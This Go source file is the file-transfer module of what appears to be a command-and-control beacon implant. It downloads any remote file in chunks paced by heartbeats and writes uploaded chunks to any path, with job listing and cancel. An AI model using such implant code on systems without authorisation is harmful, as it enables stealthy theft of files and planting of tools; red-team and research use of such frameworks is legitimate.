package command

import (
	"beacon/pkg/jobs"
	"beacon/pkg/utils/packet"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"os"
	"sort"
	"sync"
	"time"
)

const (
	transferMinChunkSize       = 4 * 1024
	transferDefaultChunkSize   = 512 * 1024
	transferMaxChunkSize       = 1024 * 1024
	transferDefaultChunksPerHB = 3
	transferMaxChunksPerHB     = 16
	transferMaxTotalChunks     = 1048576
	transferMaxPollPlans       = 16
)

type DownloadRequest struct {
	TaskID             string
	RemotePath         string
	ChunkSize          int
	ChunksPerHeartbeat int
}

type FileChunk struct {
	TaskID      string
	FileID      string
	ChunkIndex  int
	TotalChunks int
	Data        []byte
}

type DownloadState struct {
	OriginalTaskID     uint32
	TaskID             string
	RemotePath         string
	FileID             string
	ChunkSize          int
	NextChunkIndex     int
	TotalChunks        int
	ChunksPerHeartbeat int
	StartedAt          time.Time
}

type downloadReadPlan struct {
	OriginalTaskID uint32
	TaskID         string
	RemotePath     string
	FileID         string
	ChunkSize      int
	TotalChunks    int
	FirstChunk     int
	ChunkCount     int
}

type UploadChunk struct {
	RemotePath string
	Chunk      FileChunk
}

type UploadAck struct {
	TransferTaskID string
	FileID         string
	ChunkIndex     int
	WrittenBytes   int
	OK             bool
	ErrorMessage   string
}

type UploadState struct {
	OriginalTaskID uint32
	RemotePath     string
	FileID         string
	ChunkSize      int
	TotalChunks    int
	ReceivedChunks int
	ReceivedMap    []bool
	StartedAt      time.Time
}

type TransferManager struct {
	uploadMu       sync.Mutex
	uploadStates   map[string]*UploadState
	downloadMu     sync.Mutex
	downloadStates map[string]*DownloadState
}

func NewTransferManager() *TransferManager {
	return &TransferManager{
		uploadStates:   make(map[string]*UploadState),
		downloadStates: make(map[string]*DownloadState),
	}
}

func (tm *TransferManager) Download(p *packet.Parser, originalTaskID uint32, acp int) ([][]byte, error) {
	req, err := parseDownloadRequest(p)
	if err != nil {
		return downloadErrorPacket(originalTaskID, err.Error()), nil
	}

	state, err := tm.getOrCreateDownloadState(req, originalTaskID)
	if err != nil {
		return downloadErrorPacket(originalTaskID, err.Error()), nil
	}

	plan, ok := tm.buildDownloadReadPlan(state.TaskID)
	if !ok {
		return nil, nil
	}

	results, chunksDone, fatal := readDownloadPlan(plan)
	tm.commitDownloadReadPlan(plan, chunksDone, fatal)
	return results, nil
}

func (tm *TransferManager) GetPendingDownloadPackets() [][]byte {
	if tm == nil {
		return nil
	}

	plans := make([]downloadReadPlan, 0, transferMaxPollPlans)

	tm.downloadMu.Lock()
	ids := make([]string, 0, len(tm.downloadStates))
	for id := range tm.downloadStates {
		ids = append(ids, id)
	}
	sort.Strings(ids)
	for _, id := range ids {
		if len(plans) >= transferMaxPollPlans {
			break
		}
		if plan, ok := tm.buildDownloadReadPlanLocked(id); ok {
			plans = append(plans, plan)
		}
	}
	tm.downloadMu.Unlock()

	var all [][]byte
	for _, plan := range plans {
		results, chunksDone, fatal := readDownloadPlan(plan)
		tm.commitDownloadReadPlan(plan, chunksDone, fatal)
		all = append(all, results...)
	}
	return all
}

func (tm *TransferManager) Upload(p *packet.Parser, originalTaskID uint32, acp int) ([]byte, error) {
	uploadChunk, err := parseUploadChunk(p)
	if err != nil {
		taskID := uploadChunk.Chunk.TaskID
		fileID := uploadChunk.Chunk.FileID
		ackPayload, _ := packUploadAck(UploadAck{
			TransferTaskID: taskID,
			FileID:         fileID,
			ChunkIndex:     uploadChunk.Chunk.ChunkIndex,
			OK:             false,
			ErrorMessage:   err.Error(),
		})
		return ackPayload, nil
	}

	written, err := tm.writeUploadChunk(uploadChunk, originalTaskID)
	ack := UploadAck{
		TransferTaskID: uploadChunk.Chunk.TaskID,
		FileID:         uploadChunk.Chunk.FileID,
		ChunkIndex:     uploadChunk.Chunk.ChunkIndex,
		WrittenBytes:   written,
		OK:             err == nil,
	}
	if err != nil {
		ack.ErrorMessage = err.Error()
	}

	ackPayload, _ := packUploadAck(ack)
	return ackPayload, nil
}

func (tm *TransferManager) TransferJobRows() []jobs.Row {
	if tm == nil {
		return nil
	}

	now := time.Now()
	rows := make([]jobs.Row, 0)

	tm.downloadMu.Lock()
	for _, state := range tm.downloadStates {
		rows = append(rows, jobs.Row{
			ID:        state.OriginalTaskID,
			Type:      "download",
			State:     "running",
			Age:       int64(now.Sub(state.StartedAt).Seconds()),
			CommandID: CommandDownload,
			Name:      "download",
			Ref:       state.TaskID,
			Detail:    state.RemotePath,
		})
	}
	tm.downloadMu.Unlock()

	tm.uploadMu.Lock()
	for taskID, state := range tm.uploadStates {
		rows = append(rows, jobs.Row{
			ID:        state.OriginalTaskID,
			Type:      "upload",
			State:     "running",
			Age:       int64(now.Sub(state.StartedAt).Seconds()),
			CommandID: CommandUpload,
			Name:      "upload",
			Ref:       taskID,
			Detail:    state.RemotePath,
		})
	}
	tm.uploadMu.Unlock()

	sort.Slice(rows, func(i, j int) bool { return rows[i].ID < rows[j].ID })
	return rows
}

func (tm *TransferManager) CancelTransferJob(jobID uint32) (string, bool) {
	if tm == nil {
		return "", false
	}

	tm.downloadMu.Lock()
	for taskID, state := range tm.downloadStates {
		if state.OriginalTaskID == jobID {
			delete(tm.downloadStates, taskID)
			tm.downloadMu.Unlock()
			return "download job canceled", true
		}
	}
	tm.downloadMu.Unlock()

	tm.uploadMu.Lock()
	for taskID, state := range tm.uploadStates {
		if state.OriginalTaskID == jobID {
			delete(tm.uploadStates, taskID)
			tm.uploadMu.Unlock()
			return "upload job canceled", true
		}
	}
	tm.uploadMu.Unlock()

	return "", false
}

func parseDownloadRequest(p *packet.Parser) (DownloadRequest, error) {
	req := DownloadRequest{
		TaskID:             p.ParseString(),
		RemotePath:         p.ParseString(),
		ChunkSize:          int(p.ParseInt32()),
		ChunksPerHeartbeat: int(p.ParseInt32()),
	}
	if p.HasError() {
		return req, p.Error()
	}
	if req.TaskID == "" {
		return req, errors.New("missing transfer task id")
	}
	if req.RemotePath == "" {
		return req, errors.New("missing remote path")
	}

	req.ChunkSize = clampChunkSize(req.ChunkSize)
	req.ChunksPerHeartbeat = clampChunksPerHeartbeat(req.ChunksPerHeartbeat)
	return req, nil
}

func (tm *TransferManager) getOrCreateDownloadState(req DownloadRequest, originalTaskID uint32) (*DownloadState, error) {
	tm.downloadMu.Lock()
	state := tm.downloadStates[req.TaskID]
	tm.downloadMu.Unlock()
	if state != nil {
		return state, nil
	}

	fileID, size, err := fileIdentity(req.RemotePath)
	if err != nil {
		return nil, err
	}
	totalChunks64 := int64(1)
	if size > 0 {
		totalChunks64 = (size + int64(req.ChunkSize) - 1) / int64(req.ChunkSize)
	}
	if totalChunks64 > transferMaxTotalChunks {
		return nil, errors.New("download has too many chunks")
	}

	tm.downloadMu.Lock()
	defer tm.downloadMu.Unlock()
	if state = tm.downloadStates[req.TaskID]; state != nil {
		return state, nil
	}

	state = &DownloadState{
		OriginalTaskID:     originalTaskID,
		TaskID:             req.TaskID,
		RemotePath:         req.RemotePath,
		FileID:             fileID,
		ChunkSize:          req.ChunkSize,
		TotalChunks:        int(totalChunks64),
		ChunksPerHeartbeat: req.ChunksPerHeartbeat,
		StartedAt:          time.Now(),
	}
	tm.downloadStates[req.TaskID] = state
	return state, nil
}

func (tm *TransferManager) buildDownloadReadPlan(taskID string) (downloadReadPlan, bool) {
	tm.downloadMu.Lock()
	defer tm.downloadMu.Unlock()
	return tm.buildDownloadReadPlanLocked(taskID)
}

func (tm *TransferManager) buildDownloadReadPlanLocked(taskID string) (downloadReadPlan, bool) {
	state := tm.downloadStates[taskID]
	if state == nil {
		return downloadReadPlan{}, false
	}
	if state.NextChunkIndex >= state.TotalChunks {
		delete(tm.downloadStates, taskID)
		return downloadReadPlan{}, false
	}

	remaining := state.TotalChunks - state.NextChunkIndex
	chunkCount := remaining
	if chunkCount > state.ChunksPerHeartbeat {
		chunkCount = state.ChunksPerHeartbeat
	}
	if chunkCount <= 0 {
		return downloadReadPlan{}, false
	}

	return downloadReadPlan{
		OriginalTaskID: state.OriginalTaskID,
		TaskID:         state.TaskID,
		RemotePath:     state.RemotePath,
		FileID:         state.FileID,
		ChunkSize:      state.ChunkSize,
		TotalChunks:    state.TotalChunks,
		FirstChunk:     state.NextChunkIndex,
		ChunkCount:     chunkCount,
	}, true
}

func readDownloadPlan(plan downloadReadPlan) ([][]byte, int, bool) {
	file, err := os.Open(plan.RemotePath)
	if err != nil {
		return downloadErrorPacket(plan.OriginalTaskID, "open download file failed"), 0, true
	}
	defer file.Close()

	results := make([][]byte, 0, plan.ChunkCount)
	buf := make([]byte, plan.ChunkSize)
	chunksDone := 0

	for i := 0; i < plan.ChunkCount; i++ {
		idx := plan.FirstChunk + i
		offset := int64(idx * plan.ChunkSize)
		n, err := file.ReadAt(buf, offset)
		if err != nil && err != io.EOF {
			return append(results, downloadErrorPacket(plan.OriginalTaskID, "read download file failed")...), chunksDone, true
		}

		data := make([]byte, n)
		copy(data, buf[:n])
		payload, _ := packFileChunk(FileChunk{
			TaskID:      plan.TaskID,
			FileID:      plan.FileID,
			ChunkIndex:  idx,
			TotalChunks: plan.TotalChunks,
			Data:        data,
		})
		results = append(results, packet.MakeFinalPacket(plan.OriginalTaskID, CommandDownload, payload))
		chunksDone++
	}

	return results, chunksDone, false
}

func (tm *TransferManager) commitDownloadReadPlan(plan downloadReadPlan, chunksDone int, fatal bool) {
	tm.downloadMu.Lock()
	defer tm.downloadMu.Unlock()

	state := tm.downloadStates[plan.TaskID]
	if state == nil {
		return
	}
	if fatal {
		delete(tm.downloadStates, plan.TaskID)
		return
	}
	if chunksDone <= 0 || state.NextChunkIndex != plan.FirstChunk {
		return
	}
	state.NextChunkIndex += chunksDone
	if state.NextChunkIndex >= state.TotalChunks {
		delete(tm.downloadStates, plan.TaskID)
	}
}

func downloadErrorPacket(originalTaskID uint32, msg string) [][]byte {
	return [][]byte{packet.MakeFinalPacket(originalTaskID, CommandDownload, []byte(msg))}
}

func packFileChunk(chunk FileChunk) ([]byte, error) {
	return packet.PackArray([]any{
		chunk.TaskID,
		chunk.FileID,
		int32(chunk.ChunkIndex),
		int32(chunk.TotalChunks),
		packet.PackBytes(chunk.Data),
	})
}

func parseUploadChunk(p *packet.Parser) (UploadChunk, error) {
	remotePath := p.ParseString()
	taskID := p.ParseString()
	fileID := p.ParseString()
	chunkIndex := int(p.ParseInt32())
	totalChunks := int(p.ParseInt32())
	data := p.ParseBytes()

	chunk := UploadChunk{
		RemotePath: remotePath,
		Chunk: FileChunk{
			TaskID:      taskID,
			FileID:      fileID,
			ChunkIndex:  chunkIndex,
			TotalChunks: totalChunks,
			Data:        data,
		},
	}
	if p.HasError() {
		return chunk, p.Error()
	}
	if chunk.RemotePath == "" {
		return chunk, errors.New("missing remote path")
	}
	if chunk.Chunk.TaskID == "" {
		return chunk, errors.New("missing transfer task id")
	}
	if chunk.Chunk.FileID == "" {
		return chunk, errors.New("missing file id")
	}
	if chunk.Chunk.ChunkIndex < 0 || chunk.Chunk.TotalChunks <= 0 || chunk.Chunk.ChunkIndex >= chunk.Chunk.TotalChunks {
		return chunk, errors.New("invalid upload chunk index")
	}
	if chunk.Chunk.TotalChunks > transferMaxTotalChunks {
		return chunk, errors.New("upload has too many chunks")
	}
	if len(chunk.Chunk.Data) > transferMaxChunkSize {
		return chunk, errors.New("upload chunk too large")
	}
	return chunk, nil
}

func (tm *TransferManager) writeUploadChunk(chunk UploadChunk, originalTaskID uint32) (int, error) {
	state, chunkSize, alreadyReceived, err := tm.prepareUploadChunk(chunk, originalTaskID)
	if err != nil {
		return 0, err
	}
	if alreadyReceived {
		return len(chunk.Chunk.Data), nil
	}

	offset := int64(chunk.Chunk.ChunkIndex) * int64(chunkSize)
	file, err := os.OpenFile(chunk.RemotePath, os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	n, err := file.WriteAt(chunk.Chunk.Data, offset)
	if err != nil {
		return n, err
	}
	if n != len(chunk.Chunk.Data) {
		return n, errors.New("write upload chunk failed")
	}

	tm.commitUploadChunk(chunk.Chunk.TaskID, chunk.Chunk.ChunkIndex, state)
	return n, nil
}

func (tm *TransferManager) prepareUploadChunk(chunk UploadChunk, originalTaskID uint32) (*UploadState, int, bool, error) {
	tm.uploadMu.Lock()
	defer tm.uploadMu.Unlock()

	state := tm.uploadStates[chunk.Chunk.TaskID]
	if state == nil {
		if chunk.Chunk.ChunkIndex != 0 {
			return nil, 0, false, errors.New("missing initial chunk to determine chunk size")
		}
		if chunk.Chunk.TotalChunks > 1 && len(chunk.Chunk.Data) == 0 {
			return nil, 0, false, errors.New("invalid initial chunk size")
		}
		state = &UploadState{
			RemotePath:     chunk.RemotePath,
			FileID:         chunk.Chunk.FileID,
			ChunkSize:      len(chunk.Chunk.Data),
			TotalChunks:    chunk.Chunk.TotalChunks,
			ReceivedMap:    make([]bool, chunk.Chunk.TotalChunks),
			OriginalTaskID: originalTaskID,
			StartedAt:      time.Now(),
		}
		tm.uploadStates[chunk.Chunk.TaskID] = state
	}

	if state.FileID != chunk.Chunk.FileID || state.TotalChunks != chunk.Chunk.TotalChunks {
		return nil, 0, false, errors.New("upload transfer metadata mismatch")
	}
	if chunk.Chunk.ChunkIndex == 0 {
		if state.ChunkSize != len(chunk.Chunk.Data) {
			return nil, 0, false, errors.New("upload chunk size mismatch")
		}
	} else if state.ChunkSize == 0 {
		return nil, 0, false, errors.New("missing initial chunk to determine chunk size")
	} else if chunk.Chunk.ChunkIndex+1 < chunk.Chunk.TotalChunks && state.ChunkSize != len(chunk.Chunk.Data) {
		return nil, 0, false, errors.New("upload chunk size mismatch")
	}

	return state, state.ChunkSize, state.ReceivedMap[chunk.Chunk.ChunkIndex], nil
}

func (tm *TransferManager) commitUploadChunk(taskID string, chunkIndex int, expected *UploadState) {
	tm.uploadMu.Lock()
	defer tm.uploadMu.Unlock()

	state := tm.uploadStates[taskID]
	if state == nil || state != expected || state.ReceivedMap[chunkIndex] {
		return
	}

	state.ReceivedMap[chunkIndex] = true
	state.ReceivedChunks++
	if state.ReceivedChunks >= state.TotalChunks {
		delete(tm.uploadStates, taskID)
	}
}

func packUploadAck(ack UploadAck) ([]byte, error) {
	return packet.PackArray([]any{
		ack.TransferTaskID,
		ack.FileID,
		int32(ack.ChunkIndex),
		int32(ack.WrittenBytes),
		ack.OK,
		ack.ErrorMessage,
	})
}

// fileIdentity 基于文件元数据生成 fileID，O(1) 不读取文件内容。
// 用于下载状态标识；size/mtime 变更时 ID 变化，内容替换但元数据未变时无法检测（可接受的权衡）。
func fileIdentity(path string) (string, int64, error) {
	stat, err := os.Stat(path)
	if err != nil {
		return "", 0, err
	}

	h := sha256.New()
	fmt.Fprintf(h, "%s|%d|%d", path, stat.ModTime().UnixNano(), stat.Size())
	return hex.EncodeToString(h.Sum(nil)), stat.Size(), nil
}

func clampChunkSize(value int) int {
	if value <= 0 {
		return transferDefaultChunkSize
	}
	if value < transferMinChunkSize {
		return transferMinChunkSize
	}
	if value > transferMaxChunkSize {
		return transferMaxChunkSize
	}
	return value
}

func clampChunksPerHeartbeat(value int) int {
	if value <= 0 {
		return transferDefaultChunksPerHB
	}
	if value > transferMaxChunksPerHB {
		return transferMaxChunksPerHB
	}
	return value
}
